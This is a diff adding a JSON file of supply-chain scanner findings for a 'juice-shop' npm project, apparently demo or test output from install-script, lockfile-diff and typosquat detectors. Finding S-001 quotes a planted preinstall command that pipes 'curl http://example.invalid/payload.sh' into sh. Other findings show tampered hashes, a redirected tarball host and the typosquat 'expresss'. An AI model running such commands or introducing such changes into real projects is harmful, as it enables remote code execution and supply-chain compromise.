@@ -1,0 +1,182 @@
+[
+  {
+    "id": "S-001",
+    "type": "suspicious_change",
+    "category": "install_script",
+    "component": {
+      "name": "juice-shop",
+      "version": "20.4.0-SNAPSHOT",
+      "purl": "pkg:npm/juice-shop@20.4.0-SNAPSHOT"
+    },
+    "title": "preinstall script in package.json (network call, pipe to shell)",
+    "severity": "high",
+    "initial_risk": "high",
+    "cve": null,
+    "cvss": null,
+    "fixed_version": null,
+    "is_transitive": null,
+    "root_dependency": null,
+    "path": [
+      "juice-shop",
+      "juice-shop"
+    ],
+    "evidence": [
+      {
+        "kind": "verified",
+        "source": "install-script-detector",
+        "detail": "preinstall: echo \"planted-risk demo: curl http://example.invalid/payload.sh | sh\""
+      }
+    ],
+    "explanation": null
+  },
+  {
+    "id": "S-002",
+    "type": "suspicious_change",
+    "category": "lockfile_diff",
+    "component": {
+      "name": "@adraffy/ens-normalize",
+      "version": "1.11.1",
+      "purl": "pkg:npm/@adraffy/ens-normalize@1.11.1"
+    },
+    "title": "Same version, different integrity hash",
+    "severity": "high",
+    "initial_risk": "high",
+    "cve": null,
+    "cvss": null,
+    "fixed_version": null,
+    "is_transitive": null,
+    "root_dependency": null,
+    "path": [
+      "juice-shop",
+      "@adraffy/ens-normalize"
+    ],
+    "evidence": [
+      {
+        "kind": "verified",
+        "source": "lockfile-diff-detector",
+        "detail": "node_modules/@adraffy/ens-normalize@1.11.1: integrity sha512-nhCBV3quEgesuf7c7KYfperqSS14T8bYuvJ8PcLJp6znkZpFc0AuW4qBtr8eKVyPPe/8RSr7sglCWPU5eaxwKQ== -> sha512-nhCBV3quEgesuf7c7KYfperqSS14T8bYuvJ8PcLJp6znkZpFc0AuW4qBtr8eKVyPPe/8RSr7sglCWPU5eaxwABCD"
+      }
+    ],
+    "explanation": null
+  },
+  {
+    "id": "S-003",
+    "type": "suspicious_change",
+    "category": "lockfile_diff",
+    "component": {
+      "name": "@ai-sdk/gateway",
+      "version": "99.0.0",
+      "purl": "pkg:npm/@ai-sdk/gateway@99.0.0"
+    },
+    "title": "Dependency version changed",
+    "severity": "medium",
+    "initial_risk": "medium",
+    "cve": null,
+    "cvss": null,
+    "fixed_version": null,
+    "is_transitive": null,
+    "root_dependency": null,
+    "path": [
+      "juice-shop",
+      "@ai-sdk/gateway"
+    ],
+    "evidence": [
+      {
+        "kind": "verified",
+        "source": "lockfile-diff-detector",
+        "detail": "node_modules/@ai-sdk/gateway: 3.0.241 -> 99.0.0"
+      }
+    ],
+    "explanation": null
+  },
+  {
+    "id": "S-004",
+    "type": "suspicious_change",
+    "category": "lockfile_diff",
+    "component": {
+      "name": "@ai-sdk/openai-compatible",
+      "version": "2.0.94",
+      "purl": "pkg:npm/@ai-sdk/openai-compatible@2.0.94"
+    },
+    "title": "Download link moved to a different host",
+    "severity": "high",
+    "initial_risk": "high",
+    "cve": null,
+    "cvss": null,
+    "fixed_version": null,
+    "is_transitive": null,
+    "root_dependency": null,
+    "path": [
+      "juice-shop",
+      "@ai-sdk/openai-compatible"
+    ],
+    "evidence": [
+      {
+        "kind": "verified",
+        "source": "lockfile-diff-detector",
+        "detail": "node_modules/@ai-sdk/openai-compatible: resolved https://registry.npmjs.org/@ai-sdk/openai-compatible/-/openai-compatible-2.0.94.tgz -> https://packages.example.invalid/@ai-sdk/openai-compatible/-/openai-compatible-2.0.94.tgz"
+      }
+    ],
+    "explanation": null
+  },
+  {
+    "id": "S-005",
+    "type": "suspicious_change",
+    "category": "lockfile_diff",
+    "component": {
+      "name": "expresss",
+      "version": "4.18.2",
+      "purl": "pkg:npm/expresss@4.18.2"
+    },
+    "title": "New dependency added",
+    "severity": "medium",
+    "initial_risk": "medium",
+    "cve": null,
+    "cvss": null,
+    "fixed_version": null,
+    "is_transitive": null,
+    "root_dependency": null,
+    "path": [
+      "juice-shop",
+      "expresss"
+    ],
+    "evidence": [
+      {
+        "kind": "verified",
+        "source": "lockfile-diff-detector",
+        "detail": "+ node_modules/expresss 4.18.2 (resolved: https://registry.npmjs.org/expresss/-/expresss-4.18.2.tgz)"
+      }
+    ],
+    "explanation": null
+  },
+  {
+    "id": "S-006",
+    "type": "suspicious_change",
+    "category": "typosquat",
+    "component": {
+      "name": "expresss",
+      "version": "4.18.2",
+      "purl": "pkg:npm/expresss@4.18.2"
+    },
+    "title": "Possible typosquat: looks like 'express'",
+    "severity": "high",
+    "initial_risk": "high",
+    "cve": null,
+    "cvss": null,
+    "fixed_version": null,
+    "is_transitive": null,
+    "root_dependency": null,
+    "path": [
+      "juice-shop",
+      "expresss"
+    ],
+    "evidence": [
+      {
+        "kind": "verified",
+        "source": "typosquat-detector",
+        "detail": "expresss ~ express (similarity 0.93); new in lockfile: node_modules/expresss"
+      }
+    ],
+    "explanation": null
+  }
+]
